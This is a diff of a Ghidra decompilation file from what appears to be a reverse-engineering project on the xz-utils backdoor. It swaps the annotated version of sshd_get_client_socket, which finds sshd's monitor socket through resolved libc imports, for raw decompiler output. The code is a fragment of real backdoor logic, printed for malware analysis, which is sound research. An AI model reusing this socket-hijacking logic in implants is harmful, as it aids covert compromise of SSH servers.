@@ -1,7 +1,7 @@
 // /home/kali/xzre-ghidra/xzregh/107C60_sshd_get_client_socket.c
 // Function: sshd_get_client_socket @ 0x107C60
-// Calling convention: __stdcall
-// Prototype: BOOL __stdcall sshd_get_client_socket(global_context_t * ctx, int * pSocket, int socket_index, SocketMode socket_direction)
+// Calling convention: unknown
+// Prototype: undefined sshd_get_client_socket(void)
 
 
 /*
@@ -13,56 +13,53 @@
 #include "xzre_types.h"
 
 
-BOOL sshd_get_client_socket
-               (global_context_t *ctx,int *pSocket,int socket_index,SocketMode socket_direction)
+undefined8 sshd_get_client_socket(long param_1,int *param_2,undefined4 param_3,int param_4)
 
 {
-  monitor *addr;
-  BOOL BVar1;
-  ssize_t sVar2;
-  int *piVar3;
-  libc_imports_t *plVar4;
-  int fd;
+  int iVar1;
+  int iVar2;
+  undefined8 uVar3;
+  int *piVar4;
+  long lVar5;
   int *errno_ptr;
-  monitor *monitor_ptr;
   int client_fd;
   
-  if (((ctx == (global_context_t *)0x0) ||
-      (plVar4 = ctx->libc_imports, plVar4 == (libc_imports_t *)0x0)) || (pSocket == (int *)0x0)) {
-    return FALSE;
+  if (((param_1 == 0) || (lVar5 = *(long *)(param_1 + 0x10), lVar5 == 0)) || (param_2 == (int *)0x0)
+     ) {
+    return 0;
   }
-  if (ctx->struct_monitor_ptr_address != (monitor **)0x0) {
-    addr = *ctx->struct_monitor_ptr_address;
-    BVar1 = is_range_mapped((u8 *)addr,4,ctx);
-    if (BVar1 != FALSE) {
-      if (socket_direction == DIR_WRITE) {
-        fd = addr->m_recvfd;
+  if (*(undefined8 **)(param_1 + 0x48) != (undefined8 *)0x0) {
+    piVar4 = (int *)**(undefined8 **)(param_1 + 0x48);
+    iVar1 = is_range_mapped(piVar4,4,param_1);
+    if (iVar1 != 0) {
+      if (param_4 == 0) {
+        iVar1 = *piVar4;
       }
       else {
-        if (socket_direction != DIR_READ) {
-          return FALSE;
+        if (param_4 != 1) {
+          return 0;
         }
-        fd = addr->m_sendfd;
+        iVar1 = piVar4[1];
       }
       client_fd._0_1_ = 0;
-      plVar4 = ctx->libc_imports;
-      if (((-1 < fd) && (plVar4 != (libc_imports_t *)0x0)) &&
-         ((plVar4->read != (_func_25 *)0x0 && (plVar4->__errno_location != (_func_26 *)0x0)))) {
+      lVar5 = *(long *)(param_1 + 0x10);
+      if (((-1 < iVar1) && (lVar5 != 0)) &&
+         ((*(long *)(lVar5 + 0x48) != 0 && (*(long *)(lVar5 + 0x50) != 0)))) {
         do {
-          sVar2 = (*plVar4->read)(fd,&client_fd,0);
-          piVar3 = (*plVar4->__errno_location)();
-          if (-1 < (int)sVar2) goto LAB_00107d34;
-        } while (*piVar3 == 4);
-        if (*piVar3 != 9) {
+          iVar2 = (**(code **)(lVar5 + 0x48))(iVar1,&client_fd,0);
+          piVar4 = (int *)(**(code **)(lVar5 + 0x50))();
+          if (-1 < iVar2) goto LAB_00107d34;
+        } while (*piVar4 == 4);
+        if (*piVar4 != 9) {
 LAB_00107d34:
-          *pSocket = fd;
-          return TRUE;
+          *param_2 = iVar1;
+          return 1;
         }
       }
     }
-    plVar4 = ctx->libc_imports;
+    lVar5 = *(long *)(param_1 + 0x10);
   }
-  BVar1 = sshd_get_usable_socket(pSocket,socket_index,plVar4);
-  return BVar1;
+  uVar3 = sshd_get_usable_socket(param_2,param_3,lVar5);
+  return uVar3;
 }
 
